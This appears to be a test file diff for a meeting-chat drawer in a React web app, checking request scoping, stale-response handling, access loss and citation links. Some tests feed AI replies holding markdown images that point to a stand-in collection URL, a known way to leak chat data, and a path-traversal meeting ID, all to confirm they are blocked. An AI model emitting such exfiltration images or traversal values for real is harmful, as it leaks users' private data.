@@ -1,0 +1,407 @@
+import { act, create, type ReactTestRenderer } from "react-test-renderer";
+import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
+import { MemoryRouter, useLocation } from "react-router";
+import { afterEach, expect, it, vi } from "vitest";
+
+// No jsdom in this environment; ChatDrawer's private-mode effect registers a real
+// `beforeunload` listener once privateMode goes true, which only this file's tests drive.
+vi.stubGlobal("window", { addEventListener: vi.fn(), removeEventListener: vi.fn() });
+
+import { meetingChatSurface } from "@moss/shared";
+import type * as ApiClientModule from "../../apps/web/src/api/client.js";
+
+vi.mock("../../apps/web/src/api/client.js", async (importOriginal) => ({
+  ApiError: (await importOriginal<typeof ApiClientModule>()).ApiError,
+  sendChatTurn: vi.fn(async () => ({
+    userMessageId: "user-1",
+    assistantMessageId: "assistant-1",
+    reply: "ok",
+    sourceFreshness: null
+  })),
+  cancelChatTurn: vi.fn(async () => undefined),
+  clearChat: vi.fn(async () => undefined),
+  endPrivateChat: vi.fn(async () => undefined),
+  beaconEndPrivateChat: vi.fn(() => undefined),
+  getChatPrivacyState: vi.fn(async () => ({ incognito: false })),
+  listChatThreads: vi.fn(async () => ({ threads: [] })),
+  listChatThreadMessages: vi.fn(async () => ({ messages: [] })),
+  listChatSkills: vi.fn(async () => ({ skills: [] })),
+  resumeChat: vi.fn(async () => ({})),
+  listTasks: vi.fn(async () => ({ tasks: [] })),
+  listCalendarEvents: vi.fn(async () => ({ events: [] })),
+  lookupAiCapabilityRoute: vi.fn(async () => ({
+    route: { capability: "chat", available: true, reason: "matched-active-model", model: null }
+  })),
+  getPersonaSettings: vi.fn(async () => ({
+    persona: { assistantName: "Alfred", personaText: "" }
+  })),
+  getChatModelOverrideSettings: vi.fn(async () => ({
+    settings: {
+      overrideEnabled: false,
+      currentOverrideModelId: null,
+      effectiveOverrideModelId: null,
+      defaultModel: null,
+      selectedModel: null,
+      selectableOverrideModels: []
+    }
+  })),
+  getChatModelFavorites: vi.fn(async () => ({ modelIds: [] })),
+  putChatModelFavorites: vi.fn(async (input: { modelIds: string[] }) => input)
+}));
+
+import { sendChatTurn } from "../../apps/web/src/api/client.js";
+import { ChatDrawer } from "../../apps/web/src/chat/chat-drawer.js";
+
+import { Composer } from "../../apps/web/src/chat/composer.js";
+import { MeetingChatDrawer } from "../../apps/web/src/chat/meeting-chat-drawer.js";
+import {
+  MeetingSourceLink,
+  meetingCoverageLabel,
+  validMeetingEvidencePath
+} from "../../apps/web/src/chat/meeting-source-link.js";
+import {
+  validMeetingChatInput,
+  setMeetingChatHook,
+  useMeetingChat
+} from "../../packages/module-web-sdk/src/meeting-chat.js";
+const meetingId = "11223344-1122-4122-8122-112233445566";
+const selection = { meetingId, selectionId: "selection-one", title: "Private review" };
+const coverage = {
+  ...selection,
+  transcriptRevision: 4,
+  cursor: 9,
+  cutoffMs: 754000,
+  throughMs: 750000,
+  containsProvisional: true,
+  omittedSegments: 2
+};
+const response = {
+  reply: "A selected meeting answer",
+  userMessageId: "user",
+  assistantMessageId: "answer",
+  meetingContext: coverage,
+  answerProvenance: [],
+  answerProvenanceCitedIds: []
+};
+let renderer: ReactTestRenderer | undefined;
+let client: QueryClient;
+const fetchMock = vi.fn();
+afterEach(async () => {
+  if (renderer) await act(async () => renderer!.unmount());
+  renderer = undefined;
+  client?.clear();
+  vi.clearAllMocks();
+});
+async function mount(gated = false) {
+  vi.stubGlobal("fetch", fetchMock);
+  client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
+  await act(async () => {
+    renderer = create(
+      <QueryClientProvider client={client}>
+        <MemoryRouter>
+          {gated ? (
+            <MeetingChatDrawer selection={selection} onClose={() => {}} isFounder={false} />
+          ) : (
+            <ChatDrawer
+              open
+              onClose={() => {}}
+              records={[]}
+              clearRecords={() => {}}
+              streamErrorCount={0}
+              isFounder={false}
+              surface={meetingChatSurface(meetingId)}
+              meetingContext={selection}
+            />
+          )}
+        </MemoryRouter>
+      </QueryClientProvider>
+    );
+  });
+  await act(async () => {
+    await new Promise((resolve) => setTimeout(resolve, 10));
+  });
+  return renderer!;
+}
+function json(value: unknown, status = 200) {
+  return new Response(JSON.stringify(value), {
+    status,
+    headers: { "content-type": "application/json" }
+  });
+}
+it("opens through the browser-safe host bridge without submitting a turn", () => {
+  const openMeetingChat = vi.fn();
+  setMeetingChatHook(() => ({ openMeetingChat, clearMeetingChat: () => {} }));
+  useMeetingChat().openMeetingChat(selection);
+  expect(openMeetingChat).toHaveBeenCalledWith(selection);
+  expect(sendChatTurn).not.toHaveBeenCalled();
+  expect(validMeetingChatInput(selection)).toBe(true);
+  expect(validMeetingChatInput({ ...selection, meetingId: "../../other" })).toBe(false);
+  expect(validMeetingChatInput({ ...selection, title: " " })).toBe(false);
+});
+it("uses the shared composer and sends only the bound meeting selection", async () => {
+  fetchMock.mockImplementation(async () => json(response));
+  const view = await mount();
+  const composer = view.root.findByType(Composer);
+  expect(composer.props.textOnly).toBe(true);
+  expect(fetchMock).not.toHaveBeenCalled();
+  await act(async () => composer.props.onSend("What was decided?"));
+  const [url, init] = fetchMock.mock.calls[0]!;
+  expect(url).toBe("/api/chat/turn");
+  expect(JSON.parse(init.body)).toEqual({
+    text: "What was decided?",
+    surface: meetingChatSurface(meetingId),
+    meetingContext: { meetingId, selectionId: selection.selectionId }
+  });
+  expect(sendChatTurn).not.toHaveBeenCalled();
+  expect(JSON.stringify(view.toJSON())).toContain("Includes provisional text");
+  expect(JSON.stringify(view.toJSON())).toContain("Partial context");
+});
+it("does not restore a late answer after New chat clears the meeting turn", async () => {
+  let finish!: (value: Response) => void;
+  fetchMock.mockImplementation(
+    () =>
+      new Promise<Response>((resolve) => {
+        finish = resolve;
+      })
+  );
+  const view = await mount();
+  await act(async () => view.root.findByType(Composer).props.onSend("What was decided?"));
+  await act(async () =>
+    view.root
+      .findAll((node) => node.type === "button" && node.props["aria-label"] === "New chat")[0]!
+      .props.onClick()
+  );
+  await act(async () => finish(json(response)));
+  expect(JSON.stringify(view.toJSON())).not.toContain("A selected meeting answer");
+});
+it("hides title and history when an access refresh fails", async () => {
+  fetchMock.mockImplementation(async () => json({ available: true }));
+  const view = await mount(true);
+  expect(JSON.stringify(view.toJSON())).toContain("Private review");
+  fetchMock.mockImplementation(async () => json({ error: "Meeting unavailable" }, 404));
+  await act(async () => {
+    await client.refetchQueries({ queryKey: ["meeting-chat-access", selection.selectionId] });
+  });
+  await act(async () => {
+    await new Promise((resolve) => setTimeout(resolve, 10));
+  });
+  expect(JSON.stringify(view.toJSON())).not.toContain("Private review");
+  expect(JSON.stringify(view.toJSON())).toContain("Meeting unavailable");
+});
+it("retains coverage and only accepts exact local evidence ranges", () => {
+  expect(meetingCoverageLabel(coverage)).toBe(
+    "Cutoff 12:34 · Latest included 12:30 · Revision 4 · Includes provisional text · Partial context"
+  );
+  expect(
+    validMeetingEvidencePath(
+      `/meetings?id=${meetingId}&segmentId=${meetingId}&segmentRevision=1&startCharacter=0&endCharacter=12`
+    )
+  ).toBe(true);
+  expect(validMeetingEvidencePath("https://example.com/meetings?id=x")).toBe(false);
+  expect(validMeetingEvidencePath(`/meetings?id=${meetingId}`)).toBe(false);
+});
+
+it("renders no network image from a meeting answer", async () => {
+  fetchMock.mockImplementation(async () =>
+    json({ ...response, reply: "![private](https://example.com/collect?text=secret)" })
+  );
+  const view = await mount();
+  await act(async () => view.root.findByType(Composer).props.onSend("Summarize"));
+  expect(view.root.findAllByType("img")).toHaveLength(0);
+  expect(JSON.stringify(view.toJSON())).not.toContain("https://example.com/collect");
+});
+it("shows a functional unsupported-model error without sending ordinary chat", async () => {
+  fetchMock.mockImplementation(async () =>
+    json(
+      {
+        error: "Meeting questions require an API-key chat model",
+        code: "meeting_chat_unsupported"
+      },
+      422
+    )
+  );
+  const view = await mount();
+  await act(async () => view.root.findByType(Composer).props.onSend("Summarize"));
+  expect(view.root.findByType(Composer).props.sendError).toBe(
+    "Meeting questions require an API-key chat model"
+  );
+  expect(sendChatTurn).not.toHaveBeenCalled();
+});
+
+it("exposes no feedback or memory controls on scoped turns", async () => {
+  fetchMock.mockImplementation(async () => json(response));
+  const view = await mount();
+  await act(async () => view.root.findByType(Composer).props.onSend("Summarize"));
+  expect(
+    view.root.findAll(
+      (node) =>
+        typeof node.props.className === "string" && node.props.className.includes("feedback-menu")
+    )
+  ).toHaveLength(0);
+});
+it("cannot navigate on an old source response after selection is removed", async () => {
+  let finish!: (value: Response) => void;
+  fetchMock.mockImplementation(
+    () =>
+      new Promise<Response>((resolve) => {
+        finish = resolve;
+      })
+  );
+  vi.stubGlobal("fetch", fetchMock);
+  const locations: string[] = [];
+  function Location() {
+    locations.push(useLocation().pathname);
+    return null;
+  }
+  const card = {
+    supportId: "S1",
+    sourceKind: "meeting" as const,
+    sourceLabel: "00:12",
+    title: "Transcript",
+    state: "confirmed_source" as const,
+    canDereference: true
+  };
+  const element = (show: boolean) => (
+    <MemoryRouter>
+      <Location />
+      {show ? <MeetingSourceLink card={card} messageId="answer" /> : null}
+    </MemoryRouter>
+  );
+  await act(async () => {
+    renderer = create(element(true));
+  });
+  await act(async () => renderer!.root.findByType("button").props.onClick());
+  await act(async () => renderer!.update(element(false)));
+  await act(async () =>
+    finish(
+      json({
+        deepLinkPath: `/meetings?id=${meetingId}&segmentId=${meetingId}&segmentRevision=1&startCharacter=0&endCharacter=12`
+      })
+    )
+  );
+  expect(locations).not.toContain("/meetings");
+});
+it("cannot show a completed turn after the drawer selection unmounts", async () => {
+  let finish!: (value: Response) => void;
+  fetchMock.mockImplementation(
+    () =>
+      new Promise<Response>((resolve) => {
+        finish = resolve;
+      })
+  );
+  const view = await mount();
+  await act(async () => view.root.findByType(Composer).props.onSend("Summarize"));
+  await act(async () => view.update(<div>Another selection</div>));
+  await act(async () => finish(json(response)));
+  expect(JSON.stringify(view.toJSON())).toContain("Another selection");
+  expect(JSON.stringify(view.toJSON())).not.toContain("A selected meeting answer");
+});
+
+it("never labels an old completion as the newly selected meeting", async () => {
+  let finish!: (value: Response) => void;
+  fetchMock.mockImplementation(
+    () =>
+      new Promise<Response>((resolve) => {
+        finish = resolve;
+      })
+  );
+  const view = await mount();
+  await act(async () => view.root.findByType(Composer).props.onSend("Summarize first meeting"));
+  const next = {
+    meetingId: "22334455-2233-4233-8233-223344556677",
+    selectionId: "selection-two",
+    title: "Another review"
+  };
+  await act(async () =>
+    view.update(
+      <QueryClientProvider client={client}>
+        <MemoryRouter>
+          <ChatDrawer
+            key={next.selectionId}
+            open
+            onClose={() => {}}
+            records={[]}
+            clearRecords={() => {}}
+            streamErrorCount={0}
+            isFounder={false}
+            surface={meetingChatSurface(next.meetingId)}
+            meetingContext={next}
+          />
+        </MemoryRouter>
+      </QueryClientProvider>
+    )
+  );
+  await act(async () => finish(json(response)));
+  expect(JSON.stringify(view.toJSON())).toContain("Another review");
+  expect(JSON.stringify(view.toJSON())).not.toContain("Private review");
+  expect(JSON.stringify(view.toJSON())).not.toContain("A selected meeting answer");
+});
+
+it("keeps legacy meeting history inert even without coverage metadata", async () => {
+  const view = await mount();
+  await act(async () =>
+    view.update(
+      <QueryClientProvider client={client}>
+        <MemoryRouter>
+          <ChatDrawer
+            open
+            onClose={() => {}}
+            records={[
+              { kind: "user", text: "Private question", messageId: "u-old" },
+              {
+                kind: "reply",
+                text: "![leak](https://example.com/collect?text=private)",
+                messageId: "a-old"
+              }
+            ]}
+            clearRecords={() => {}}
+            streamErrorCount={0}
+            isFounder={false}
+            surface={meetingChatSurface(meetingId)}
+            meetingContext={selection}
+          />
+        </MemoryRouter>
+      </QueryClientProvider>
+    )
+  );
+  expect(view.root.findAllByType("img")).toHaveLength(0);
+  expect(
+    view.root.findAll(
+      (node) =>
+        typeof node.props.className === "string" && node.props.className.includes("feedback-menu")
+    )
+  ).toHaveLength(0);
+});
+
+it("dereferences a citation and opens the pinned range", async () => {
+  const deepLinkPath = `/meetings?id=${meetingId}&segmentId=${meetingId}&segmentRevision=4&startCharacter=3&endCharacter=12`;
+  fetchMock.mockImplementation(async () => json({ deepLinkPath }));
+  vi.stubGlobal("fetch", fetchMock);
+  const locations: string[] = [];
+  function Location() {
+    const location = useLocation();
+    locations.push(location.pathname + location.search);
+    return null;
+  }
+  await act(async () => {
+    renderer = create(
+      <MemoryRouter>
+        <Location />
+        <MeetingSourceLink
+          messageId="answer"
+          card={{
+            supportId: "S1",
+            sourceKind: "meeting",
+            sourceLabel: "00:12",
+            title: "Transcript",
+            state: "confirmed_source",
+            canDereference: true
+          }}
+        />
+      </MemoryRouter>
+    );
+  });
+  await act(async () => renderer!.root.findByType("button").props.onClick());
+  expect(fetchMock.mock.calls[0]![0]).toBe("/api/chat/messages/answer/provenance/S1/dereference");
+  expect(locations).toContain(deepLinkPath);
+});
